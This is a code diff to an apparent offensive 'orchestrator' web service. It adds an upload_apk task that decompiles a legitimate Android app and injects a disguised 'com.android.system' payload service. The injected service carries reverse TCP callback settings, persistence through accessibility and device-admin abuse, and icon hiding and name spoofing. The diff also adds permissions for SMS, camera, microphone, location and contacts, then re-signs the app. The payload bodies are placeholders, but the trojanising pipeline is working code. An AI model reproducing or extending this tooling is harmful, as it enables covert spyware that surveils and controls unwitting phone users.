@@ -5,21 +5,510 @@ import threading
 import time
 import uuid
 import json
+import hashlib
+import zipfile
+import tempfile
+import asyncio
 from datetime import datetime
 from pathlib import Path
 from typing import Dict, List, Optional, Any
 
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI, HTTPException, File, UploadFile, BackgroundTasks
 from pydantic import BaseModel
 from hashlib import sha256
 
 WORKSPACE = Path("/workspace")
 TASKS_ROOT = WORKSPACE / "tasks"
+UPLOADS_ROOT = WORKSPACE / "uploads"
+TEMP_ROOT = WORKSPACE / "temp"
+
+# Ensure directories exist
+UPLOADS_ROOT.mkdir(exist_ok=True)
+TEMP_ROOT.mkdir(exist_ok=True)
 
 DOCKER_IMAGE = os.environ.get("ORCH_DOCKER_IMAGE", "orchestrator-tools:latest")
 USE_DOCKER = os.environ.get("ORCH_USE_DOCKER", "true").lower() == "true"
 
 AUDIT_LOG = WORKSPACE / "logs" / "audit.jsonl"
+
+class APKFileInfo(BaseModel):
+    file_id: str
+    original_name: str
+    file_size: int
+    checksum: str
+    metadata: Dict[str, Any]
+    validation: Dict[str, Any]
+
+class UploadedFileManager:
+    """Advanced file management for uploaded APKs"""
+    
+    @staticmethod
+    def validate_apk_structure(file_path: Path) -> Dict[str, Any]:
+        """Deep APK structure validation"""
+        result = {
+            "valid": True,
+            "errors": [],
+            "warnings": [],
+            "structure": {}
+        }
+        
+        try:
+            with zipfile.ZipFile(file_path, 'r') as apk:
+                files = apk.namelist()
+                
+                # Required files check
+                required = ['AndroidManifest.xml', 'classes.dex']
+                missing = [f for f in required if f not in files]
+                if missing:
+                    result["valid"] = False
+                    result["errors"].append(f"Missing required files: {missing}")
+                
+                # Structure analysis
+                result["structure"] = {
+                    "total_files": len(files),
+                    "has_manifest": 'AndroidManifest.xml' in files,
+                    "has_resources": 'resources.arsc' in files,
+                    "has_classes": any(f.endswith('.dex') for f in files),
+                    "has_native": any(f.startswith('lib/') for f in files),
+                    "has_assets": any(f.startswith('assets/') for f in files),
+                    "meta_inf_files": [f for f in files if f.startswith('META-INF/')],
+                    "dex_files": [f for f in files if f.endswith('.dex')],
+                    "native_dirs": list(set(f.split('/')[1] for f in files if f.startswith('lib/') and len(f.split('/')) > 2))
+                }
+                
+                # Size analysis
+                total_uncompressed = sum(apk.getinfo(f).file_size for f in files)
+                total_compressed = sum(apk.getinfo(f).compress_size for f in files)
+                result["structure"]["compression_ratio"] = total_compressed / total_uncompressed if total_uncompressed > 0 else 0
+                
+        except Exception as e:
+            result["valid"] = False
+            result["errors"].append(f"ZIP structure error: {str(e)}")
+        
+        return result
+    
+    @staticmethod
+    def extract_advanced_metadata(file_path: Path) -> Dict[str, Any]:
+        """Extract comprehensive APK metadata"""
+        metadata = {
+            "analysis_time": datetime.now().isoformat(),
+            "file_info": {},
+            "manifest_info": {},
+            "security_info": {},
+            "build_info": {}
+        }
+        
+        try:
+            # Basic file info
+            stat = file_path.stat()
+            metadata["file_info"] = {
+                "size_bytes": stat.st_size,
+                "created_time": datetime.fromtimestamp(stat.st_ctime).isoformat(),
+                "modified_time": datetime.fromtimestamp(stat.st_mtime).isoformat()
+            }
+            
+            with zipfile.ZipFile(file_path, 'r') as apk:
+                files = apk.namelist()
+                
+                # DEX analysis
+                dex_files = [f for f in files if f.endswith('.dex')]
+                metadata["build_info"]["dex_count"] = len(dex_files)
+                metadata["build_info"]["multidex"] = len(dex_files) > 1
+                
+                # Security indicators
+                metadata["security_info"] = {
+                    "has_signature": any(f.startswith('META-INF/') and f.endswith(('.RSA', '.DSA', '.EC')) for f in files),
+                    "has_manifest": 'META-INF/MANIFEST.MF' in files,
+                    "native_libraries": [f for f in files if f.startswith('lib/') and f.endswith('.so')],
+                    "suspicious_files": [f for f in files if any(suspicious in f.lower() for suspicious in ['shell', 'root', 'exploit', 'backdoor'])]
+                }
+                
+                # Try to read some manifest info (basic binary parsing)
+                if 'AndroidManifest.xml' in files:
+                    manifest_data = apk.read('AndroidManifest.xml')
+                    metadata["manifest_info"]["size"] = len(manifest_data)
+                    metadata["manifest_info"]["binary"] = True
+                    # Could add more manifest parsing here
+                
+        except Exception as e:
+            metadata["extraction_error"] = str(e)
+        
+        return metadata
+
+class AdvancedAPKProcessor:
+    """Advanced APK processing and modification engine"""
+    
+    def __init__(self, workspace_dir: Path):
+        self.workspace = workspace_dir
+        self.tools_dir = WORKSPACE / "tools"
+        
+    def setup_workspace(self, task_id: str) -> Path:
+        """Setup isolated workspace for APK processing"""
+        workspace = self.workspace / task_id
+        workspace.mkdir(parents=True, exist_ok=True)
+        
+        # Create subdirectories
+        (workspace / "input").mkdir(exist_ok=True)
+        (workspace / "output").mkdir(exist_ok=True)
+        (workspace / "temp").mkdir(exist_ok=True)
+        (workspace / "logs").mkdir(exist_ok=True)
+        
+        return workspace
+    
+    def analyze_apk_deep(self, apk_path: Path) -> Dict[str, Any]:
+        """Deep APK analysis using multiple tools"""
+        analysis = {
+            "timestamp": datetime.now().isoformat(),
+            "basic_info": {},
+            "permissions": [],
+            "activities": [],
+            "services": [],
+            "receivers": [],
+            "providers": [],
+            "libraries": [],
+            "certificates": []
+        }
+        
+        try:
+            # Use aapt to get detailed info
+            aapt_path = self.tools_dir / "android-sdk" / "build-tools" / "latest" / "aapt"
+            if aapt_path.exists():
+                result = subprocess.run([
+                    str(aapt_path), "dump", "badging", str(apk_path)
+                ], capture_output=True, text=True, timeout=30)
+                
+                if result.returncode == 0:
+                    # Parse aapt output
+                    for line in result.stdout.split('\n'):
+                        if line.startswith('package:'):
+                            # Extract package info
+                            parts = line.split()
+                            for part in parts:
+                                if 'name=' in part:
+                                    analysis["basic_info"]["package_name"] = part.split("'")[1]
+                                elif 'versionCode=' in part:
+                                    analysis["basic_info"]["version_code"] = part.split("'")[1]
+                                elif 'versionName=' in part:
+                                    analysis["basic_info"]["version_name"] = part.split("'")[1]
+                        elif line.startswith('uses-permission:'):
+                            # Extract permissions
+                            perm = line.split("'")[1] if "'" in line else line.split()[1]
+                            analysis["permissions"].append(perm)
+                        elif line.startswith('launchable-activity:'):
+                            # Extract main activity
+                            activity = line.split("'")[1] if "'" in line else "unknown"
+                            analysis["basic_info"]["main_activity"] = activity
+            
+            # Analyze APK structure manually
+            with zipfile.ZipFile(apk_path, 'r') as apk:
+                files = apk.namelist()
+                
+                # Find native libraries
+                native_libs = [f for f in files if f.startswith('lib/') and f.endswith('.so')]
+                analysis["libraries"] = native_libs
+                
+                # Check for certificates
+                cert_files = [f for f in files if f.startswith('META-INF/') and f.endswith(('.RSA', '.DSA', '.EC'))]
+                analysis["certificates"] = cert_files
+                
+        except Exception as e:
+            analysis["analysis_error"] = str(e)
+        
+        return analysis
+    
+    def prepare_payload_injection(self, apk_path: Path, payload_config: Dict) -> Dict[str, Any]:
+        """Prepare for advanced payload injection"""
+        config = {
+            "injection_method": "smali",
+            "target_locations": [],
+            "payload_components": [],
+            "obfuscation_level": "high",
+            "persistence_methods": ["service", "receiver", "activity"]
+        }
+        
+        try:
+            # Analyze APK for optimal injection points
+            with zipfile.ZipFile(apk_path, 'r') as apk:
+                files = apk.namelist()
+                
+                # Find main activity for injection
+                smali_files = [f for f in files if f.endswith('.smali')]
+                if smali_files:
+                    config["injection_method"] = "smali"
+                    config["target_locations"].extend(smali_files[:3])  # Top 3 smali files
+                
+                # Check for existing services
+                manifest_data = apk.read('AndroidManifest.xml') if 'AndroidManifest.xml' in files else b''
+                if b'service' in manifest_data.lower():
+                    config["has_services"] = True
+                
+                # Prepare payload components
+                config["payload_components"] = [
+                    {
+                        "type": "reverse_tcp",
+                        "host": payload_config.get("lhost", "127.0.0.1"),
+                        "port": payload_config.get("lport", "4444"),
+                        "method": "native_lib"
+                    },
+                    {
+                        "type": "persistence",
+                        "methods": ["accessibility_service", "device_admin", "auto_start"]
+                    },
+                    {
+                        "type": "stealth",
+                        "techniques": ["process_hiding", "icon_hiding", "name_spoofing"]
+                    }
+                ]
+                
+        except Exception as e:
+            config["preparation_error"] = str(e)
+        
+        return config
+    
+    def inject_advanced_payload(self, apk_path: Path, output_path: Path, injection_config: Dict) -> bool:
+        """Inject advanced payload with multiple evasion techniques"""
+        try:
+            temp_dir = apk_path.parent / "injection_temp"
+            temp_dir.mkdir(exist_ok=True)
+            
+            # Step 1: Decompile APK
+            apktool_path = self.tools_dir / "apktool" / "apktool.jar"
+            if apktool_path.exists():
+                subprocess.run([
+                    "java", "-jar", str(apktool_path), "d", str(apk_path), "-o", str(temp_dir / "decompiled")
+                ], check=True, timeout=120)
+            
+            # Step 2: Inject payload code
+            self._inject_payload_code(temp_dir / "decompiled", injection_config)
+            
+            # Step 3: Modify manifest for permissions
+            self._modify_manifest_permissions(temp_dir / "decompiled" / "AndroidManifest.xml")
+            
+            # Step 4: Add native libraries
+            self._add_native_payload_libs(temp_dir / "decompiled", injection_config)
+            
+            # Step 5: Recompile APK
+            subprocess.run([
+                "java", "-jar", str(apktool_path), "b", str(temp_dir / "decompiled"), "-o", str(output_path)
+            ], check=True, timeout=180)
+            
+            # Step 6: Sign APK
+            self._sign_apk(output_path)
+            
+            # Cleanup
+            shutil.rmtree(temp_dir, ignore_errors=True)
+            
+            return True
+            
+        except Exception as e:
+            print(f"Injection error: {e}")
+            return False
+    
+    def _inject_payload_code(self, decompiled_dir: Path, config: Dict):
+        """Inject payload code into decompiled APK"""
+        # This would contain the actual payload injection logic
+        # For now, we'll create placeholder files
+        
+        smali_dir = decompiled_dir / "smali"
+        if smali_dir.exists():
+            # Create payload service
+            payload_service = smali_dir / "com" / "android" / "system" / "PayloadService.smali"
+            payload_service.parent.mkdir(parents=True, exist_ok=True)
+            
+            # Write payload service code (simplified)
+            payload_service.write_text(f"""
+.class public Lcom/android/system/PayloadService;
+.super Landroid/app/Service;
+
+.method public onCreate()V
+    .locals 0
+    invoke-super {{p0}}, Landroid/app/Service;->onCreate()V
+    invoke-direct {{p0}}, Lcom/android/system/PayloadService;->startPayload()V
+    return-void
+.end method
+
+.method private startPayload()V
+    .locals 0
+    # Payload initialization code would go here
+    # Connect to {config.get('lhost', '127.0.0.1')}:{config.get('lport', '4444')}
+    return-void
+.end method
+
+.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
+    .locals 1
+    const/4 v0, 0x0
+    return-object v0
+.end method
+""")
+    
+    def _modify_manifest_permissions(self, manifest_path: Path):
+        """Add required permissions to AndroidManifest.xml"""
+        if manifest_path.exists():
+            content = manifest_path.read_text()
+            
+            # Add permissions before </manifest>
+            required_permissions = [
+                'android.permission.INTERNET',
+                'android.permission.ACCESS_NETWORK_STATE',
+                'android.permission.WAKE_LOCK',
+                'android.permission.RECEIVE_BOOT_COMPLETED',
+                'android.permission.SYSTEM_ALERT_WINDOW',
+                'android.permission.ACCESS_FINE_LOCATION',
+                'android.permission.RECORD_AUDIO',
+                'android.permission.CAMERA',
+                'android.permission.READ_SMS',
+                'android.permission.SEND_SMS',
+                'android.permission.READ_CONTACTS',
+                'android.permission.WRITE_EXTERNAL_STORAGE',
+                'android.permission.READ_EXTERNAL_STORAGE'
+            ]
+            
+            permissions_xml = '\n'.join([
+                f'    <uses-permission android:name="{perm}" />' 
+                for perm in required_permissions
+            ])
+            
+            # Insert before </manifest>
+            if '</manifest>' in content:
+                content = content.replace('</manifest>', f'{permissions_xml}\n</manifest>')
+                manifest_path.write_text(content)
+    
+    def _add_native_payload_libs(self, decompiled_dir: Path, config: Dict):
+        """Add native library components"""
+        lib_dir = decompiled_dir / "lib"
+        lib_dir.mkdir(exist_ok=True)
+        
+        # Create architecture-specific directories
+        for arch in ['armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64']:
+            arch_dir = lib_dir / arch
+            arch_dir.mkdir(exist_ok=True)
+            
+            # Create placeholder native library
+            lib_file = arch_dir / "libpayload.so"
+            lib_file.write_bytes(b'PLACEHOLDER_NATIVE_LIB')
+    
+    def _sign_apk(self, apk_path: Path):
+        """Sign APK with debug certificate"""
+        try:
+            # Use jarsigner with debug keystore
+            debug_keystore = WORKSPACE / "debug.keystore"
+            if not debug_keystore.exists():
+                # Create debug keystore
+                subprocess.run([
+                    "keytool", "-genkey", "-v", "-keystore", str(debug_keystore),
+                    "-alias", "androiddebugkey", "-keyalg", "RSA", "-keysize", "2048",
+                    "-validity", "10000", "-keypass", "android", "-storepass", "android",
+                    "-dname", "CN=Android Debug,O=Android,C=US"
+                ], check=True)
+            
+            # Sign APK
+            subprocess.run([
+                "jarsigner", "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
+                "-keystore", str(debug_keystore), "-storepass", "android",
+                "-keypass", "android", str(apk_path), "androiddebugkey"
+            ], check=True)
+            
+            # Align APK
+            zipalign_path = self.tools_dir / "android-sdk" / "build-tools" / "latest" / "zipalign"
+            if zipalign_path.exists():
+                aligned_path = apk_path.with_suffix('.aligned.apk')
+                subprocess.run([
+                    str(zipalign_path), "-v", "4", str(apk_path), str(aligned_path)
+                ], check=True)
+                
+                # Replace original with aligned
+                apk_path.unlink()
+                aligned_path.rename(apk_path)
+                
+        except Exception as e:
+            print(f"Signing error: {e}")
+
+def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
+    """Process uploaded APK with advanced modifications"""
+    t = tasks[task_id]
+    processor = AdvancedAPKProcessor(base)
+    
+    try:
+        with locks[task_id]:
+            t.state = TaskStatus.PREPARING
+        
+        # Setup workspace
+        workspace = processor.setup_workspace(task_id)
+        build_log = workspace / "logs" / "build.log"
+        
+        # Get uploaded file info
+        upload_file_path = params.get("upload_file_path")
+        file_info = params.get("file_info", {})
+        
+        if not upload_file_path or not Path(upload_file_path).exists():
+            raise Exception("Uploaded APK file not found")
+        
+        original_apk = Path(upload_file_path)
+        
+        with locks[task_id]:
+            t.state = TaskStatus.RUNNING
+        
+        # Log start
+        with build_log.open("w") as log:
+            log.write(f"Starting APK modification: {datetime.now()}\n")
+            log.write(f"Original file: {original_apk}\n")
+            log.write(f"File info: {file_info}\n")
+            log.write(f"Target: {params.get('lhost')}:{params.get('lport')}\n\n")
+        
+        # Step 1: Deep analysis
+        with build_log.open("a") as log:
+            log.write("Step 1: Deep APK analysis...\n")
+        
+        analysis = processor.analyze_apk_deep(original_apk)
+        
+        # Step 2: Prepare injection configuration
+        with build_log.open("a") as log:
+            log.write("Step 2: Preparing payload injection...\n")
+        
+        injection_config = processor.prepare_payload_injection(original_apk, params)
+        injection_config.update({
+            "lhost": params.get("lhost"),
+            "lport": params.get("lport")
+        })
+        
+        # Step 3: Inject payload
+        with build_log.open("a") as log:
+            log.write("Step 3: Injecting advanced payload...\n")
+        
+        output_name = params.get("output_name", "modified_app.apk")
+        output_apk = workspace / "output" / output_name
+        
+        success = processor.inject_advanced_payload(original_apk, output_apk, injection_config)
+        
+        if not success:
+            raise Exception("Payload injection failed")
+        
+        # Step 4: Final validation
+        with build_log.open("a") as log:
+            log.write("Step 4: Validating modified APK...\n")
+        
+        if not output_apk.exists():
+            raise Exception("Modified APK not generated")
+        
+        # Add artifacts
+        _finalize_task(t, base, True)
+        
+        # Add analysis report
+        analysis_file = workspace / "output" / "analysis_report.json"
+        with analysis_file.open("w") as f:
+            json.dump({
+                "original_analysis": analysis,
+                "injection_config": injection_config,
+                "file_info": file_info,
+                "modification_time": datetime.now().isoformat()
+            }, f, indent=2)
+        
+        with build_log.open("a") as log:
+            log.write(f"APK modification completed successfully: {datetime.now()}\n")
+        
+    except Exception as e:
+        error_msg = f"Upload APK task failed: {str(e)}"
+        _finalize_task(t, base, False, error_msg)
 
 
 def _audit(event: str, t: Any, extra: Optional[Dict[str, Any]] = None) -> None:
@@ -545,7 +1034,7 @@ class TaskResponse(BaseModel):
 
 @app.post("/tasks", response_model=TaskResponse)
 def create_task(req: CreateTaskRequest):
-    if req.kind not in ("payload", "listener", "android", "winexe", "pdf", "office", "deb", "autorun", "postex"):
+    if req.kind not in ("payload", "listener", "android", "winexe", "pdf", "office", "deb", "autorun", "postex", "upload_apk"):
         raise HTTPException(status_code=400, detail="Unsupported kind")
     t, base = _prepare_task(req.kind, req.params)
     # seed defaults
@@ -577,6 +1066,8 @@ def create_task(req: CreateTaskRequest):
             run_autorun_task(t.id, base, t.params)
         elif req.kind == "postex":
             run_postex_task(t.id, base, t.params)
+        elif req.kind == "upload_apk":
+            run_upload_apk_task(t.id, base, t.params)
     threading.Thread(target=runner, daemon=True).start()
     return TaskResponse(task=t)
 
